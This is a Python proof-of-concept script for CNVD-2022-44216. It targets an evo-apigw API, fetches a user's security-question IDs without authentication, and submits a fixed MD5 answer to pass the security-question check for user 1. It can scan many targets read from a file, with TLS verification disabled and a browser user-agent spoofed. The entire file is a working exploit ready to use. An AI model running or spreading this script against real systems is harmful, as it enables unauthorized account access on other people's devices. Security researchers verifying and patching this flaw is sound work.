import argparse
import json

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def poc(target):
    session = requests.session()
    session.verify = False
    session.headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        mid = session.get(target + "/evo-apigw/evo-brm/1.2.0/secret-problem/list?userId=1").json()['data']['value']
        salt = []
        for item in mid:
            salt.append(item['id'])
        if len(salt) != 3:
            print("[-]", target, "不存在漏洞")
            return
        payload = {"userId": 1, "userSecretRelVOS": [{"problemAnswer": "c4ca4238a0b923820dcc509a6f75849b", "secretId": salt[0]},
                                                     {"problemAnswer": "c4ca4238a0b923820dcc509a6f75849b", "secretId": salt[1]},
                                                     {"problemAnswer": "c4ca4238a0b923820dcc509a6f75849b", "secretId": salt[2]}]}
        result = session.post(target + "/evo-apigw/evo-brm/1.2.0/secret-problem/verify", data=json.dumps(payload), timeout=1).text
    except:
        print("[-]", target, "访问超时")
        return
    if "true" in result:
        print("[+]", target, "存在漏洞")
        return
    print("[-]", target, "不存在漏洞")


if __name__ == '__main__':
    print("""
 ██████╗███╗   ██╗██╗   ██╗██████╗       ██████╗  ██████╗ ██████╗ ██████╗       ██╗  ██╗██╗  ██╗██████╗  ██╗ ██████╗ 
██╔════╝████╗  ██║██║   ██║██╔══██╗      ╚════██╗██╔═████╗╚════██╗╚════██╗      ██║  ██║██║  ██║╚════██╗███║██╔════╝ 
██║     ██╔██╗ ██║██║   ██║██║  ██║█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗███████║███████║ █████╔╝╚██║███████╗ 
██║     ██║╚██╗██║╚██╗ ██╔╝██║  ██║╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ██╔═══╝ ╚════╝╚════██║╚════██║██╔═══╝  ██║██╔═══██╗
╚██████╗██║ ╚████║ ╚████╔╝ ██████╔╝      ███████╗╚██████╔╝███████╗███████╗           ██║     ██║███████╗ ██║╚██████╔╝
 ╚═════╝╚═╝  ╚═══╝  ╚═══╝  ╚═════╝       ╚══════╝ ╚═════╝ ╚══════╝╚══════╝           ╚═╝     ╚═╝╚══════╝ ╚═╝ ╚═════╝ 
                                                                                                     By: xiaoWangSec""")
    parser = argparse.ArgumentParser(description='CNVD-2022-44216验证脚本')
    parser.add_argument('-t', '--target', help='目标文本')
    parser.add_argument('-u', '--url', help='单个目标')
    args = parser.parse_args()

    if args.target:
        try:
            with open(args.target, 'r') as file:
                for line in file:
                    url = line.strip()
                    poc(url)
        except FileNotFoundError:
            print(f'文件 {args.target} 不存在')
    elif args.url:
        poc(args.url)
    else:
        parser.print_help()
